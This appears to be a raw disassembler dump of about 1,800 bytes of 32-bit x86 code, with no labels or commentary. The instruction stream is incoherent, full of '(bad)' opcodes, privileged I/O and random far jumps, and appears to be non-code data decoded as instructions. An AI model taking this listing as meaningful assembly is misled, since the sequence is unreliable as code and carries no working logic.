  410a26:	adc    ch,bh
  410a28:	es jg  0x4109e6
  410a2b:	jo     0x410a91
  410a2d:	cmp    BYTE PTR [esi],cl
  410a2f:	aam    0x31
  410a31:	adc    cl,bh
  410a33:	and    eax,0xaa63db7e
  410a38:	inc    edx
  410a39:	add    ebp,esi
  410a3b:	ja     0x410a53
  410a3d:	repz adc dh,BYTE PTR [eax+0x34]
  410a41:	scas   al,BYTE PTR es:[edi]
  410a42:	ror    DWORD PTR [ebx+0x321c28aa],0xcf
  410a49:	je     0x410a23
  410a4b:	xor    eax,0x69f40700
  410a50:	or     al,0xb5
  410a52:	repz fidivr WORD PTR [ebp+0x4a]
  410a56:	lock or dh,ch
  410a59:	inc    ecx
  410a5a:	xor    al,0x1e
  410a5c:	icebp  
  410a5d:	xor    BYTE PTR [eax-0x6fcd017b],cl
  410a63:	out    dx,eax
  410a64:	ins    BYTE PTR es:[edi],dx
  410a65:	aaa    
  410a66:	ins    DWORD PTR es:[edi],dx
  410a67:	push   cs
  410a68:	xlat   BYTE PTR ds:[ebx]
  410a69:	fisttp DWORD PTR [edx-0x7e]
  410a6c:	mul    al
  410a6e:	push   ecx
  410a6f:	push   edx
  410a70:	pop    ebp
  410a71:	mov    edi,0xb6f74439
  410a76:	iret   
  410a77:	retf   
  410a78:	iret   
  410a79:	stos   BYTE PTR es:[edi],al
  410a7a:	add    al,0xa4
  410a7c:	call   0xfcf0:0xd72f9a1c
  410a83:	mov    ah,0x79
  410a85:	stos   DWORD PTR es:[edi],eax
  410a86:	add    al,0x37
  410a88:	dec    esp
  410a89:	fcomp  QWORD PTR ds:0xa1fab7f
  410a8f:	cs pop ds
  410a91:	call   FWORD PTR [edx-0x75b9d5a8]
  410a97:	lods   al,BYTE PTR ds:[esi]
  410a98:	lods   al,BYTE PTR ds:[esi]
  410a99:	jne    0x410b15
  410a9b:	add    BYTE PTR [edx-0x6d58492f],bh
  410aa1:	mov    WORD PTR [ebx],es
  410aa3:	dec    ebx
  410aa4:	mov    ds,WORD PTR [ebp-0x2a0c973]
  410aaa:	shl    bl,1
  410aac:	xor    al,0x12
  410aae:	add    eax,0x46d7215d
  410ab3:	aaa    
  410ab4:	fwait
  410ab5:	xchg   edx,eax
  410ab6:	loope  0x410b1e
  410ab8:	mov    dl,0xa1
  410aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410abb:	dec    edi
  410abc:	xor    eax,0x1a194379
  410ac1:	xchg   BYTE PTR [esi],dh
  410ac3:	ret    0x4236
  410ac6:	sub    al,BYTE PTR [edx-0x40]
  410ac9:	push   edx
  410aca:	lea    edx,[edx]
  410acc:	out    dx,al
  410acd:	popa   
  410ace:	sbb    DWORD PTR [esi+0x4649c11c],ecx
  410ad4:	ins    BYTE PTR es:[edi],dx
  410ad5:	adc    ah,BYTE PTR [eax-0x27]
  410ad8:	sbb    ebx,DWORD PTR [ebx]
  410ada:	xor    esi,0xffffffeb
  410add:	retf   
  410ade:	jbe    0x410b4f
  410ae0:	add    bh,ah
  410ae2:	mov    ?,WORD PTR [eax]
  410ae4:	dec    esp
  410ae5:	jecxz  0x410b22
  410ae7:	sub    eax,0x27b17ef
  410aec:	(bad)  
  410aed:	ret    0x6dd
  410af0:	mov    al,ds:0xc21fb6b4
  410af5:	jne    0x410b1c
  410af7:	or     eax,0xc8740ef6
  410afc:	push   0xffffffc0
  410afe:	loopne 0x410af9
  410b00:	(bad)  
  410b01:	mov    ebx,ds
  410b03:	push   esp
  410b04:	fldenv [edx]
  410b06:	je     0x410ac6
  410b08:	sbb    DWORD PTR [ebp+0x7fbcd3ff],ebp
  410b0e:	sbb    al,0x5c
  410b10:	pop    ecx
  410b11:	addr16 push ebp
  410b13:	xor    BYTE PTR [edx+0xbb050eb],dl
  410b19:	mov    eax,0x51fc8c79
  410b1e:	pop    esp
  410b1f:	mov    eax,0x535f7049
  410b24:	fadd   QWORD PTR [edi+0x1f1a7ac2]
  410b2a:	sbb    al,0x11
  410b2c:	push   esi
  410b2d:	mov    ?,WORD PTR [ebp+0x76a1cb54]
  410b33:	int    0x6a
  410b35:	lock mov edx,0xe2821be3
  410b3b:	sub    eax,0x5a0dbfdb
  410b40:	sub    BYTE PTR [ecx],cl
  410b42:	jmp    0x10459185
  410b47:	retf   
  410b48:	push   eax
  410b49:	add    dl,BYTE PTR [ebx+ebx*2-0x78e5f6ef]
  410b50:	sar    DWORD PTR [eax-0xfe658ae],cl
  410b56:	in     eax,0xa3
  410b58:	dec    eax
  410b59:	mov    eax,ds:0xb48c4969
  410b5e:	xchg   ecx,eax
  410b5f:	inc    esp
  410b60:	sbb    BYTE PTR [edi],0x5f
  410b63:	ret    0x6dac
  410b66:	das    
  410b67:	mov    ecx,0xc1d8278e
  410b6c:	xchg   ebx,eax
  410b6d:	push   ss
  410b6e:	mov    al,ds:0xbeef16f4
  410b73:	adc    eax,0x1f8b0ac7
  410b78:	int3   
  410b79:	popf   
  410b7a:	popa   
  410b7b:	daa    
  410b7c:	aam    0x85
  410b7e:	xchg   esi,eax
  410b7f:	ja     0x410b1d
  410b81:	push   edx
  410b82:	fbld   TBYTE PTR [edx-0x525eab0f]
  410b88:	and    DWORD PTR [eax-0x76],eax
  410b8b:	mov    al,ds:0x2ace681
  410b90:	scas   al,BYTE PTR es:[edi]
  410b91:	daa    
  410b92:	in     al,dx
  410b93:	sub    BYTE PTR [ebp+esi*4+0x6e408862],cl
  410b9a:	add    DWORD PTR [edx+0x3bddc091],0xffffffa1
  410ba1:	adc    cl,BYTE PTR [eax+0x191e8fe9]
  410ba7:	retf   0x35e5
  410baa:	xor    BYTE PTR [edx],0x8e
  410bad:	pop    ebx
  410bae:	cmp    BYTE PTR [edx+edx*8],0x7
  410bb2:	pop    esp
  410bb3:	mov    edi,0x22a02610
  410bb8:	scas   al,BYTE PTR es:[edi]
  410bb9:	push   ds
  410bba:	dec    ecx
  410bbb:	adc    BYTE PTR [eax],bh
  410bbd:	mov    ds:0x8a89f2b,al
  410bc2:	addr16 int3 
  410bc4:	popf   
  410bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bc6:	or     ah,bl
  410bc8:	or     eax,DWORD PTR [edi+0x15568159]
  410bce:	inc    edx
  410bcf:	and    edi,esi
  410bd1:	fstp   st(6)
  410bd3:	int    0xf3
  410bd5:	mov    DWORD PTR gs:[esi+0x355af535],ecx
  410bdc:	leave  
  410bdd:	inc    ecx
  410bde:	inc    eax
  410bdf:	and    DWORD PTR [esi],ebx
  410be1:	push   edi
  410be2:	je     0x410c25
  410be4:	(bad)  
  410be5:	call   0x2fb65c8d
  410bea:	dec    edi
  410beb:	pop    ecx
  410bec:	xlat   BYTE PTR ds:[ebx]
  410bed:	scas   eax,DWORD PTR es:[edi]
  410bee:	call   0x6a6b:0xd4d63bdb
  410bf5:	dec    esp
  410bf6:	into   
  410bf7:	dec    edx
  410bf8:	into   
  410bf9:	xchg   ebx,eax
  410bfa:	push   esp
  410bfb:	stos   BYTE PTR es:[edi],al
  410bfc:	stos   DWORD PTR es:[edi],eax
  410bfd:	sub    ch,ch
  410bff:	cmc    
  410c00:	dec    eax
  410c01:	dec    ebp
  410c02:	aad    0xdb
  410c04:	sahf   
  410c05:	sub    al,0x8f
  410c07:	out    dx,eax
  410c08:	sub    DWORD PTR [ecx+0xc],0x5a
  410c0c:	and    ebp,DWORD PTR [edi+0x56494111]
  410c12:	loope  0x410bfd
  410c14:	fcomp  DWORD PTR [esi+0x30ec04ef]
  410c1a:	mov    cs,WORD PTR [eax-0x647665e6]
  410c20:	add    DWORD PTR [edi-0x10],esp
  410c23:	push   ebx
  410c24:	loope  0x410c68
  410c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c27:	dec    edx
  410c28:	xchg   edi,eax
  410c29:	ficomp DWORD PTR [ecx]
  410c2b:	out    0xf1,al
  410c2d:	mov    dh,0x51
  410c2f:	out    0xc8,al
  410c31:	mov    ah,BYTE PTR [edx]
  410c33:	retf   0x4e5a
  410c36:	xor    BYTE PTR ds:0x4d70cf2e,ah
  410c3c:	call   0x7f2a:0xb87fdbdf
  410c43:	imul   BYTE PTR [ebx]
  410c45:	sar    DWORD PTR [ebx-0x1b22ab9],1
  410c4b:	cmp    ebp,DWORD PTR [ebx-0x6b8ed077]
  410c51:	dec    esp
  410c52:	test   al,0x7e
  410c54:	in     al,0xe6
  410c56:	(bad)  
  410c58:	aaa    
  410c59:	sti    
  410c5a:	xchg   DWORD PTR [edx-0x44],eax
  410c5d:	push   ebp
  410c5e:	ss addr16 dec eax
  410c61:	push   eax
  410c62:	mov    bh,0x83
  410c64:	in     eax,0xc0
  410c66:	mov    WORD PTR [ebx+0x2c],cs
  410c69:	out    0x22,eax
  410c6b:	push   0x8b843b74
  410c70:	xor    al,0x4c
  410c72:	ret    
  410c73:	sbb    eax,0x7632f725
  410c78:	sub    al,0x4b
  410c7a:	add    DWORD PTR [ebp+0x50],ebx
  410c7d:	push   ebp
  410c7e:	inc    ebx
  410c7f:	mov    bl,0x14
  410c81:	dec    esp
  410c82:	lods   al,BYTE PTR ds:[esi]
  410c83:	xor    ebx,esp
  410c85:	(bad)  
  410c86:	std    
  410c87:	bound  edi,QWORD PTR [ecx-0x75]
  410c8a:	inc    eax
  410c8b:	dec    edx
  410c8c:	mov    ebp,0x60894fa
  410c91:	dec    edi
  410c92:	enter  0x2578,0x45
  410c96:	mov    al,ds:0x3e4a4374
  410c9b:	aaa    
  410c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c9d:	mov    ebx,0x3173e9e2
  410ca2:	inc    ebp
  410ca3:	jecxz  0x410c2d
  410ca5:	(bad)  
  410ca7:	inc    edi
  410ca8:	push   esp
  410ca9:	(bad)  
  410caa:	repnz xchg edi,eax
  410cac:	pop    esp
  410cad:	frstor [edi+0x66]
  410cb0:	jg     0x410c4d
  410cb2:	push   ecx
  410cb3:	fsub   QWORD PTR [ebx]
  410cb5:	jecxz  0x410c79
  410cb7:	(bad)  
  410cb9:	mov    al,0x91
  410cbb:	lahf   
  410cbc:	inc    eax
  410cbd:	dec    ebx
  410cbe:	push   es
  410cbf:	add    BYTE PTR es:[ecx+0x7d689e35],cl
  410cc6:	xchg   esi,eax
  410cc7:	ficomp WORD PTR [eax]
  410cc9:	arpl   WORD PTR [ebp-0x1c],dx
  410ccc:	adc    DWORD PTR [edx],esp
  410cce:	dec    ebx
  410ccf:	jmp    DWORD PTR [eax+0x52dbd9ac]
  410cd5:	mov    esi,?
  410cd7:	test   BYTE PTR [eax-0x34],ah
  410cda:	shr    DWORD PTR [edx+0x4f],cl
  410cdd:	xchg   edx,eax
  410cde:	pop    edi
  410cdf:	in     al,dx
  410ce0:	aam    0x34
  410ce2:	pop    es
  410ce3:	cmp    eax,0x9fa55287
  410ce8:	enter  0xfd65,0x70
  410cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ced:	push   edi
  410cee:	bound  edi,QWORD PTR [ebx+0x51]
  410cf1:	mov    edx,DWORD PTR [ebp+0x7b50508]
  410cf7:	sbb    BYTE PTR ds:0x34a33d51,cl
  410cfd:	pop    ss
  410cfe:	popa   
  410cff:	jbe    0x410d5a
  410d01:	sahf   
  410d02:	nop
  410d03:	repz test BYTE PTR [edx+edx*8],dh
  410d07:	push   ebx
  410d08:	stos   DWORD PTR es:[edi],eax
  410d09:	cmp    eax,0x69dfa823
  410d0e:	sbb    al,0x13
  410d10:	mov    al,0x6b
  410d12:	retf   
  410d13:	mov    ecx,0x2f1d65cc
  410d18:	mov    edi,0xe806c2e0
  410d1d:	faddp  st(6),st
  410d1f:	outs   dx,DWORD PTR ds:[esi]
  410d20:	xor    al,0xe9
  410d22:	enter  0x5411,0x6d
  410d26:	rcl    BYTE PTR [ebp+0x60],0x78
  410d2a:	add    cl,ch
  410d2c:	mov    ch,0xb2
  410d2e:	out    0xaa,eax
  410d30:	cmp    DWORD PTR [ebx-0x13eaaaf2],esp
  410d36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d37:	push   ecx
  410d38:	add    DWORD PTR [ebx-0x4705d7b4],esp
  410d3e:	add    eax,0x24fbf38a
  410d43:	jl     0x410d95
  410d45:	push   0xffffffe5
  410d47:	cwde   
  410d48:	cli    
  410d49:	xchg   esi,eax
  410d4a:	sbb    bl,0x1a
  410d4d:	icebp  
  410d4e:	iret   
  410d4f:	pop    ecx
  410d50:	stos   BYTE PTR es:[edi],al
  410d51:	xchg   ebp,eax
  410d52:	add    BYTE PTR [edi+edi*1-0x3be75ea8],dl
  410d59:	fnstsw WORD PTR [ebx+ecx*2+0x63]
  410d5d:	jne    0x410dcb
  410d5f:	jno    0x410d9c
  410d61:	fwait
  410d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d63:	sbb    bh,BYTE PTR [eax-0x55]
  410d66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d67:	test   BYTE PTR [esi],0xfe
  410d6a:	retf   0x8aba
  410d6d:	cdq    
  410d6e:	sbb    dh,BYTE PTR [ebx+0x55]
  410d71:	data16 jnp 0x410d5a
  410d74:	gs cld 
  410d76:	xor    al,0x7b
  410d78:	pop    esp
  410d79:	out    0xc4,al
  410d7b:	stc    
  410d7c:	jbe    0x410cfe
  410d7e:	sbb    dh,BYTE PTR [ecx-0x7eaaee9a]
  410d84:	call   0x1f7b:0xfe3d2458
  410d8b:	sub    al,BYTE PTR [eax-0x52]
  410d8e:	popa   
  410d8f:	sti    
  410d90:	ficomp WORD PTR [edx]
  410d92:	sbb    al,0xce
  410d94:	mov    ebp,0xe568dd0e
  410d99:	fs inc ebx
  410d9b:	aaa    
  410d9c:	mov    edx,DWORD PTR [eax]
  410d9e:	mov    edi,0x58daeeae
  410da3:	and    eax,0xa08233e2
  410da8:	int3   
  410da9:	jge    0x410de4
  410dab:	mov    esp,0xf7e49d4a
  410db0:	mov    dh,0xe6
  410db2:	xchg   ecx,eax
  410db3:	fadd   QWORD PTR [esi]
  410db5:	pop    ecx
  410db7:	fistp  QWORD PTR [eax+0x4ae52a3a]
  410dbd:	ret    
  410dbe:	dec    edi
  410dbf:	imul   esi,ebx,0xd8c750a5
  410dc5:	pop    ss
  410dc6:	mov    esp,0xf51c6fe5
  410dcb:	das    
  410dcc:	lods   eax,DWORD PTR ds:[esi]
  410dcd:	xchg   ebp,eax
  410dce:	sbb    eax,0xdd3a853e
  410dd3:	shr    BYTE PTR [ebx],1
  410dd5:	jg     0x410def
  410dd7:	aam    0x2e
  410dd9:	mov    edx,DWORD PTR [edi]
  410ddb:	add    DWORD PTR [ecx+ecx*8],edx
  410dde:	nop
  410ddf:	and    dh,0xd
  410de2:	cs jg  0x410dc1
  410de5:	and    cl,BYTE PTR [ecx-0x711f36]
  410deb:	jb     0x410e60
  410ded:	cs cli 
  410def:	mov    ebp,0xcc848693
  410df4:	xlat   BYTE PTR ds:[ebx]
  410df5:	xor    eax,0x3fbbcdd4
  410dfa:	test   eax,0x2993532e
  410dff:	daa    
  410e00:	sub    al,0xa2
  410e02:	jp     0x410dd0
  410e04:	mov    ds:0x8359c568,al
  410e09:	xor    bl,BYTE PTR [ecx]
  410e0b:	addr16 cli 
  410e0d:	sub    eax,0xe1dac082
  410e12:	nop
  410e13:	lea    ebp,[ebx-0x7f816ed7]
  410e19:	sub    eax,0x380bcc19
  410e1e:	add    al,0x96
  410e20:	inc    ecx
  410e21:	fcomip st,st(7)
  410e23:	into   
  410e24:	sbb    al,0x3e
  410e26:	les    ebp,FWORD PTR ds:0xc5735ffa
  410e2c:	hlt    
  410e2d:	cmp    ecx,eax
  410e2f:	xchg   BYTE PTR [edi+eax*4],ah
  410e32:	out    dx,eax
  410e33:	add    ah,BYTE PTR [edi+0x79]
  410e36:	nop
  410e37:	xlat   BYTE PTR ds:[ebx]
  410e38:	ss push edi
  410e3a:	xor    BYTE PTR [eax-0x60],ah
  410e3d:	mov    ebp,0x902bdf53
  410e42:	push   edx
  410e43:	adc    ecx,DWORD PTR [ecx]
  410e45:	jmp    0xb38f:0x29518f1f
  410e4c:	loopne 0x410e71
  410e4e:	fild   DWORD PTR [ebx]
  410e50:	loopne 0x410e22
  410e52:	(bad)  
  410e53:	mov    esp,0x594664d3
  410e58:	xor    ch,dh
  410e5a:	adc    al,0x4e
  410e5c:	cmp    edx,DWORD PTR [eax-0x479983df]
  410e62:	lods   al,BYTE PTR ds:[esi]
  410e63:	fcmovbe st,st(6)
  410e65:	mov    ah,0xb5
  410e67:	adc    esi,DWORD PTR [edx+0x7a]
  410e6a:	mov    ebx,DWORD PTR gs:[edx-0x80]
  410e6e:	xlat   BYTE PTR ds:[ebx]
  410e6f:	in     eax,0x30
  410e71:	push   edi
  410e72:	jge    0x410e60
  410e74:	inc    edi
  410e75:	add    eax,0xeefc4661
  410e7a:	and    BYTE PTR [edx+0x32],0x4b
  410e7e:	shl    DWORD PTR [ebp-0x1],cl
  410e81:	mov    ds:0x5a7a7b35,al
  410e86:	icebp  
  410e87:	clc    
  410e88:	cwde   
  410e89:	stos   DWORD PTR es:[edi],eax
  410e8a:	push   ds
  410e8b:	ror    BYTE PTR [eax-0x71e19fe2],1
  410e91:	lds    esp,FWORD PTR [edx+ebp*8]
  410e94:	ds or  edx,edi
  410e97:	and    al,0xb5
  410e99:	push   0xbae1f85d
  410e9e:	adc    BYTE PTR [ebx-0x62426b5c],bl
  410ea4:	adc    DWORD PTR [edx+0x54],0x22
  410ea8:	adc    eax,0x749ae53a
  410ead:	out    0x53,al
  410eaf:	ins    DWORD PTR es:[edi],dx
  410eb0:	xchg   ebp,eax
  410eb1:	adc    BYTE PTR [ecx+0x66894c23],dh
  410eb7:	lds    ebx,FWORD PTR [edx-0x31]
  410eba:	adc    al,0x9
  410ebc:	push   edi
  410ebd:	(bad)  
  410ebe:	data16 out 0x18,al
  410ec1:	xchg   ebp,eax
  410ec2:	mov    ds:0xbf4697bf,al
  410ec7:	stc    
  410ec8:	dec    edi
  410ec9:	cmp    eax,DWORD PTR [esi+0x7b]
  410ecc:	pop    es
  410ecd:	loopne 0x410f1b
  410ecf:	sub    BYTE PTR [ecx+esi*2-0x3b],bl
  410ed3:	inc    eax
  410ed4:	and    DWORD PTR [eax+ebp*2-0x2e],eax
  410ed8:	and    eax,0x4c2581c4
  410edd:	mov    BYTE PTR [ebx],ch
  410edf:	pop    edi
  410ee0:	in     eax,dx
  410ee1:	(bad)  [edx+0x32b8ef81]
  410ee7:	mov    ebx,0x1e685671
  410eec:	sub    bl,ah
  410eee:	xor    bh,BYTE PTR [ebx-0x420d2b24]
  410ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ef5:	inc    edx
  410ef6:	pop    ebp
  410ef7:	pop    edx
  410ef8:	cmc    
  410ef9:	xchg   ecx,eax
  410efa:	out    dx,al
  410efb:	fcmovne st,st(1)
  410efd:	fld    DWORD PTR [esi+esi*8-0x292b8f22]
  410f04:	adc    DWORD PTR [ecx],0xf0d50ce
  410f0a:	(bad)  
  410f0b:	jne    0x410ee2
  410f0d:	sbb    cl,ah
  410f0f:	and    DWORD PTR [ebx-0x5c8f53ac],0xffffffa1
  410f16:	out    0x5c,al
  410f18:	fcomip st,st(6)
  410f1a:	(bad)  
  410f1b:	clc    
  410f1c:	shl    dh,1
  410f1e:	push   0x9de3cbdc
  410f23:	gs mov cl,0x42
  410f26:	icebp  
  410f27:	sub    ecx,edx
  410f29:	les    eax,FWORD PTR [ecx-0x224d9160]
  410f2f:	call   0xd40d:0x55def4c9
  410f36:	pop    esp
  410f37:	aad    0x34
  410f39:	inc    edx
  410f3a:	inc    edx
  410f3b:	or     al,0x9a
  410f3d:	adc    esp,DWORD PTR [eax+0x2d7aa3ca]
  410f43:	(bad)  
  410f45:	mov    bh,0x61
  410f47:	ins    BYTE PTR es:[edi],dx
  410f48:	cdq    
  410f49:	mov    DWORD PTR [ebp-0x71937909],edi
  410f4f:	inc    esi
  410f50:	loopne 0x410f54
  410f52:	nop
  410f53:	mov    ebx,0xd2aea311
  410f58:	dec    ebx
  410f59:	js     0x410f83
  410f5b:	jmp    0x85dbd037
  410f60:	xchg   ebx,eax
  410f61:	aaa    
  410f62:	test   DWORD PTR [ebx-0x767db7f1],eax
  410f68:	(bad)  
  410f69:	out    dx,al
  410f6a:	pushf  
  410f6b:	scas   eax,DWORD PTR es:[edi]
  410f6c:	add    BYTE PTR [esi],0xa4
  410f6f:	and    esi,DWORD PTR [ebp-0x3362a350]
  410f75:	gs jbe 0x410f19
  410f78:	sub    edi,DWORD PTR [ebx]
  410f7a:	mov    dh,0x39
  410f7c:	pop    edx
  410f7d:	mov    al,ds:0xeef5ec7a
  410f82:	loope  0x410ff8
  410f84:	out    0x8b,eax
  410f86:	enter  0x6e5f,0x2d
  410f8a:	push   es
  410f8b:	std    
  410f8c:	mov    ebx,0xb21290aa
  410f91:	push   esp
  410f92:	(bad)  
  410f93:	int3   
  410f94:	xchg   esp,eax
  410f95:	cmp    edi,DWORD PTR [esi+0x4bbc2674]
  410f9b:	lds    ebx,FWORD PTR [ebx]
  410f9d:	rcl    DWORD PTR [edi-0x2],cl
  410fa0:	mov    esp,0x5f1fa1ef
  410fa5:	push   cs
  410fa6:	imul   BYTE PTR [ebx+0x77]
  410fa9:	cdq    
  410faa:	xor    eax,0xfaebbd95
  410faf:	lods   eax,DWORD PTR ds:[esi]
  410fb0:	retf   0xe129
  410fb3:	push   ebp
  410fb4:	xchg   esi,eax
  410fb5:	and    eax,0xe18c4d83
  410fba:	adc    cl,cl
  410fbc:	pop    ss
  410fbd:	retf   
  410fbe:	aas    
  410fbf:	mov    BYTE PTR [ecx],al
  410fc1:	and    DWORD PTR [edi+0x54897051],esp
  410fc7:	enter  0x91b1,0x88
  410fcb:	mov    al,ds:0xb55df116
  410fd0:	sbb    ebx,esi
  410fd2:	outs   dx,DWORD PTR ds:[esi]
  410fd3:	mov    eax,ds:0xf83a88c0
  410fd8:	adc    DWORD PTR [edx+eax*2-0x3eaa5203],edi
  410fdf:	xor    esi,DWORD PTR [edi+0x2c3b2a7f]
  410fe5:	dec    ebp
  410fe6:	xchg   edx,eax
  410fe7:	test   eax,0x6c6a165
  410fec:	std    
  410fed:	or     al,0xca
  410fef:	in     eax,0x75
  410ff1:	sub    edx,DWORD PTR [edx]
  410ff3:	pop    esi
  410ff4:	repnz fnstsw WORD PTR [edx]
  410ff7:	xor    eax,0xcb8ab346
  410ffc:	popa   
  410ffd:	stos   BYTE PTR es:[edi],al
  410ffe:	adc    eax,0xaac56cce
  411003:	shl    BYTE PTR [esi],cl
  411005:	or     dh,BYTE PTR [eax+0x21]
  411008:	test   BYTE PTR es:[edi],bh
  41100b:	pop    ebp
  41100c:	jnp    0x411019
  41100e:	(bad)  
  41100f:	pop    esp
  411010:	adc    bl,BYTE PTR [ebx+0x29]
  411013:	dec    ecx
  411014:	cld    
  411015:	je     0x410fd2
  411017:	gs pusha 
  411019:	adc    BYTE PTR [ebp+0xa],bh
  41101c:	je     0x411032
  41101e:	jae    0x410fe1
  411020:	pop    esi
  411021:	pushf  
  411022:	add    eax,esp
  411024:	and    ebp,DWORD PTR [edx+0x2eaef0ca]
  41102a:	sub    DWORD PTR [eax-0x5b],edi
  41102d:	or     al,0x67
  41102f:	mov    ah,0x38
  411031:	out    0xc7,eax
  411033:	aam    0xc8
  411035:	mov    eax,ds:0x11b231cf
  41103a:	std    
  41103b:	pop    edx
  41103c:	es sub bl,0x26
  411040:	loope  0x41100e
  411042:	in     al,dx
  411043:	std    
  411044:	in     al,0x33
  411046:	push   ss
  411047:	mov    BYTE PTR [esi],ch
  411049:	jl     0x411099
  41104b:	cli    
  41104c:	mov    ecx,0x37aacdaf
  411051:	aas    
  411052:	popa   
  411053:	or     BYTE PTR [eax+esi*2],dl
  411056:	dec    esi
  411057:	inc    eax
  411058:	push   ebx
  411059:	xchg   BYTE PTR [ebx],al
  41105b:	mov    eax,ds:0xcca01d46
  411060:	and    DWORD PTR [ebp-0x3bee8fa8],edi
  411066:	push   ds
  411067:	jns    0x411019
  411069:	icebp  
  41106a:	or     edx,DWORD PTR [esi-0x59]
  41106d:	add    edi,0xa8323e1b
  411073:	bound  ecx,QWORD PTR [ebp-0x1c]
  411076:	test   al,0xdc
  411078:	mov    ebx,0x3b48c6ed
  41107d:	or     esp,DWORD PTR [ebp+esi*8-0x4f2f0307]
  411084:	cmp    ebp,DWORD PTR [ebp+0xe]
  411087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411088:	add    ebx,DWORD PTR [ebx+0x41]
  41108b:	out    0x3f,eax
  41108d:	test   DWORD PTR [ebx],edi
  41108f:	cdq    
  411090:	sub    al,ah
  411092:	pop    esp
  411093:	mov    edi,ecx
  411095:	lods   al,BYTE PTR ds:[esi]
  411096:	jp     0x411071
  411098:	es mov bl,0x1b
  41109b:	out    dx,eax
  41109c:	xchg   dl,bl
  41109e:	adc    DWORD PTR [esi+0x61],0x7580f8e4
  4110a5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110a7:	outs   dx,DWORD PTR ds:[esi]
  4110a8:	(bad)  
  4110a9:	leave  
  4110aa:	(bad)  
  4110ab:	pop    edi
  4110ac:	or     eax,0x266d3f85
  4110b1:	jecxz  0x411127
  4110b3:	inc    eax
  4110b4:	or     al,0xd6
  4110b6:	mov    esp,0x3820376d
  4110bb:	jno    0x4110b1
  4110bd:	test   BYTE PTR [eax],0xbe
  4110c0:	aaa    
  4110c1:	std    
  4110c2:	sti    
  4110c3:	les    ebp,FWORD PTR [esi-0xc4923a6]
  4110c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ca:	mov    cl,0x47
  4110cc:	loop   0x411146
  4110ce:	nop
  4110cf:	pop    edx
  4110d0:	retf   0x6728
  4110d3:	sbb    BYTE PTR [edi+0x56],0xe0
  4110d7:	or     ebx,DWORD PTR [edx+0x6]
  4110da:	inc    ebp
  4110db:	mov    BYTE PTR [edi-0x2621b1fb],cl
  4110e1:	icebp  
  4110e2:	fcmove st,st(5)
  4110e4:	jmp    0x411095
  4110e6:	mov    WORD PTR [eax+edi*2],es
  4110e9:	push   ds
  4110ea:	repz loop 0x411158
  4110ed:	lods   al,BYTE PTR ds:[esi]
  4110ee:	add    BYTE PTR [edx+0x30aeaa2c],al
  4110f4:	mov    esp,0x159d6b49
  4110f9:	mov    ch,0x2a
  4110fb:	cli    
  4110fc:	jmp    0xda7c:0xb592ad9a
  411103:	mov    WORD PTR [edi],cs
  411105:	push   ss
  411106:	es mov ebx,0xa0f03d9b
  41110c:	lock cs jle 0x4110ee
  411110:	iret   
  411111:	jl     0x4110cc
  411113:	cmp    dh,BYTE PTR [edx+0x1b1ad29c]
  411119:	mov    edx,0x735c6189
  41111e:	addr16 xor eax,0x71497293
  411124:	popf   
  411125:	test   eax,0xe6b1338
  41112a:	jmp    0x615f:0x221337cd
  411131:	rcr    esp,cl
  411133:	cs jmp 0xfd8c4fd5
  411139:	or     eax,0xa14c4d42
  41113e:	dec    edx
  41113f:	std    
  411140:	xchg   ebp,eax
  411141:	aam    0xb4
  411143:	(bad)  
  411144:	and    eax,0x520f8329
  411149:	js     0x411157
  41114b:	pop    eax
  41114c:	adc    BYTE PTR [ecx+0x29],dh
  41114f:	sti    
  411150:	add    BYTE PTR [eax],0x6a
  411153:	push   esi
  411154:	xor    eax,0xb50a7e7
  411159:	sbb    al,0xc8
  41115b:	mov    esp,0x4a6dcf75
  411160:	and    BYTE PTR [eax],0x52
  411163:	xchg   ecx,eax
  411164:	rcl    BYTE PTR [ebx+esi*2-0x2f],1
  411168:	popa   
  411169:	test   DWORD PTR [ecx-0x78],edx
  41116c:	(bad)  
  41116d:	adc    ch,ch
  41116f:	clc    
  411170:	pop    edx
  411171:	mov    ds:0xdba4d9b1,al
  411176:	int    0xf8
  411178:	jo     0x411180
  41117a:	scas   al,BYTE PTR es:[edi]
  41117b:	pusha  
  41117c:	out    0x70,al
  41117e:	popf   
  41117f:	mov    esp,0x88ea2858
  411184:	inc    esi
  411185:	fstp   QWORD PTR [eax+ebx*8]
  411188:	out    0x4d,al
  41118a:	addr16 (bad) 
  41118c:	in     eax,dx
  41118d:	jmp    0xe6fd:0x2a7e3071
  411194:	mov    al,0xdb
  411196:	ja     0x4111ad
  411198:	and    DWORD PTR [edx-0x4cad2c74],0x6a
  41119f:	xor    ebx,esi
  4111a1:	scas   al,BYTE PTR es:[edi]
  4111a2:	fistp  DWORD PTR [ecx+eax*4-0x22]
  4111a6:	fbstp  TBYTE PTR [edx]
  4111a8:	cmc    
  4111a9:	xor    DWORD PTR [esi],eax
  4111ab:	pop    edi
  4111ac:	sbb    ah,ch
  4111ae:	cld    
  4111af:	shr    BYTE PTR [ebx+ebx*1],1
  4111b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4111b3:	add    al,0xf6
  4111b5:	and    al,0x19
  4111b7:	dec    ecx
  4111b8:	ja     0x411236
  4111ba:	int    0xed
  4111bc:	sbb    dh,BYTE PTR [bx+di+0x38]
  4111c0:	retf   0x817b
  4111c3:	iret   
  4111c4:	das    
  4111c5:	std    
  4111c6:	dec    edx
  4111c7:	adc    edi,DWORD PTR [ecx+0x33]
  4111ca:	sbb    al,0x9f
  4111cc:	sti    
  4111cd:	inc    edx
  4111ce:	and    esp,DWORD PTR [esp+ebx*4+0x1b7bbab0]
  4111d5:	dec    esp
  4111d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111d7:	(bad)  
  4111d8:	or     eax,0xb98ce9e
  4111dd:	jo     0x411166
  4111df:	aas    
